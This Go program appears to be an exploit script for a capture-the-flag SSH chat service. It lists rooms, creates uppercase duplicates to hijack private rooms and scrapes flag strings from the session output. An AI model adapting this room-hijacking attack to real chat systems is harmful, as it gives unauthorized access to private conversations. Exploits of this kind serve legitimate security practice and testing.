package main

import (
	"bufio"
	"checker/pkg/client"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/acarl005/stripansi"
)

func hijackPrivateRoom(target, roomName string) error {
	if roomName == "default" {
		return fmt.Errorf("skipping default room")
	}

	upperRoom := strings.ToUpper(roomName)
	if roomName == upperRoom {
		return fmt.Errorf("room already hijacked")
	}

	//wait some time until the flag arrives
	//<-time.After(time.Second * 3)
	hijacker, err := client.GenerateNewUser()
	if err != nil {
		return err
	}

	_, sessIO, ch, err := client.CreateSSHSession(context.Background(), hijacker.Name, target, hijacker.PrivateKey)
	if err != nil {
		return err
	}

	_, err = fmt.Fprintf(sessIO, "/create %s 1234\n\r", upperRoom)
	if err != nil {
		ch.Execute()
		return err
	}

	// leave chat and rejoin
	<-time.After(time.Second)
	ch.Execute()
	<-time.After(time.Second)

	_, sessIO, ch, err = client.CreateSSHSession(context.Background(), hijacker.Name, target, hijacker.PrivateKey)
	if err != nil {
		return err
	}
	defer ch.Execute()

	flagChan := make(chan string)
	scanner := bufio.NewScanner(sessIO)
	go func() {
		for scanner.Scan() {
			txt := stripansi.Strip(scanner.Text())
			if strings.Contains(txt, "ENO") {
				flagChan <- txt
			}
		}
		if err := scanner.Err(); err != nil {
			log.Println(err)
		}
		close(flagChan)
	}()

	select {
	case <-time.After(time.Second * 3):
		return fmt.Errorf("flag not found")
	case flag := <-flagChan:
		if flag != "" {
			log.Printf("FOUND FLAG %s", flag)
		}
		return nil
	}
}

func run(target string) error {
	attacker, err := client.GenerateNewUser()
	if err != nil {
		return err
	}

	_, sessIO, ch, err := client.CreateSSHSession(context.Background(), attacker.Name, target, attacker.PrivateKey)
	if err != nil {
		return err
	}
	defer ch.Execute()

	if _, err := fmt.Fprintf(sessIO, "/rooms\n\r"); err != nil {
		return err
	}
	roomChan := make(chan string)
	scanner := bufio.NewScanner(sessIO)
	go func() {
		for scanner.Scan() {
			txt := stripansi.Strip(scanner.Text())
			if strings.Contains(txt, "* ") {
				splitTxt := strings.Split(txt, " ")
				roomChan <- splitTxt[2]
			}
		}
		if err := scanner.Err(); err != nil {
			log.Println(err)
		}
		close(roomChan)
	}()

	for roomName := range roomChan {
		log.Printf("trying room %s", roomName)
		err = hijackPrivateRoom(target, roomName)
		if err != nil {
			log.Println(err)
		}
	}
	return nil
}

func main() {
	log.Println("starting...")
	target := "localhost"
	roomName := ""
	if len(os.Args) >= 2 {
		target = os.Args[1]
	}
	if len(os.Args) >= 3 {
		roomName = os.Args[2]
	}

	log.Printf("target:    %s", target)
	log.Printf("room name: %s", roomName)

	if roomName != "" {
		if err := hijackPrivateRoom(target, roomName); err != nil {
			log.Fatal(err)
		}
		log.Println("done.")
		return
	}

	if err := run(target); err != nil {
		log.Fatal(err)
	}
	log.Println("done.")
}
